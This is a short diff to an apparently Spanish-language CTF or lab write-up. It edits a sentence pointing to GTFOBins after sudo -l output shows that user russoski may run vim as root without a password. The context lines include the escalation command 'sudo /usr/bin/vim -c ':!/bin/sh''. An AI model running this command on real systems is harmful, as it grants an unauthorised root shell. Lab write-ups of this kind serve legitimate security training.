@@ -241,13 +241,9 @@ User russoski may run the following commands on 7646d085583b:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-Si investigamos en la pág
-
-https://gtfobins.github.io/
-
+Si investigamos en la página web de [GTFOBINS](https://gtfobins.github.io/) vemos como podemos conseguir una shell con permisos sudo.
 
 ![](../../../Images/Pasted%20image%2020241008162323.png)
-
 
 ```
 russoski@7646d085583b:~$ sudo /usr/bin/vim -c ':!/bin/sh'
